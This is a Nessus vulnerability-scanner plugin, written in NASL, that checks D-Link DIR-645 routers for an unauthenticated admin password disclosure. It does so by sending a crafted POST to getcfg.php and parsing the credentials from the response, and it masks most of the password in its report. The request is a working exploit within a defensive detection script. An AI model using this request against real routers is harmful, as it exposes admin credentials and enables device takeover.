#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66238);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_bugtraq_id(58231);
  script_osvdb_id(90733);

  script_name(english:"D-Link DIR-645 getcfg.php Admin Password Disclosure");
  script_summary(english:"Attempts to get the admin password");

  script_set_attribute(attribute:"synopsis", value:
"The remote router is affected by an information disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote D-Link DIR-645 router is affected by an information
disclosure vulnerability.  By sending a specially crafted request to the
'getcfg.php' script, a remote unauthenticated attacker could retrieve
the admin password information.");
  # http://www.h-online.com/security/news/item/D-Link-fixes-router-vulnerabilities-very-quietly-1816873.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6347341a");
  script_set_attribute(attribute:"solution", value:"Upgrade to firmware version 1.03 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2013/02/27");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/11/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/04/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("d-link_router_detect.nasl");
  script_require_keys("www/d-link");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

model = get_kb_item_or_exit('d-link/model');
if ('DIR-645' >!< model) audit(AUDIT_HOST_NOT, 'D-Link DIR-645');

port = get_http_port(default:80, embedded:1);

# Make sure the service is a D-Link router
get_kb_item_or_exit('www/'+port+'/d-link');
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

url = '/getcfg.php';
req = http_mk_post_req(
  port:port,
  item:'/getcfg.php',
  add_headers:make_array('Content-Type', 'application/x-www-form-urlencoded'),
  data:'SERVICES=DEVICE.ACCOUNT'
);

res = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);

if ('<service>DEVICE.ACCOUNT</service>' >< res[2])
{
  body = res[2];
  body = strstr(body, '<name>admin</name>');
  body = body - strstr(body, '</password>');

  user = body - strstr(body, '</name>');
  user = user - '<name>';

  pass = strstr(body, '<password>') - '<password>';
  # mask the actual password except the first and last character
  pass = pass[0] + crap(data:'*', length:6) + pass[strlen(pass)-1];

  if (user && pass)
  {
    if (report_verbosity > 0)
    {
      req_str = http_mk_buffer_from_req(req:req);

      report =
        '\nNessus was able to exploit the vulnerability to gather the credentials' +
        '\nof the DIR-645 router using the following request :\n' +
        '\n' +
        crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n' +
        req_str + '\n' +
        crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n';
      if (report_verbosity > 1)
      {
        report +=
          '\n' +
          '\n  Username : ' + user +
          '\n  Password : ' + pass +
          '\n' +
          '\nNote that the password displayed here has been partially obfuscated.\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_HOST_NOT, 'affected');
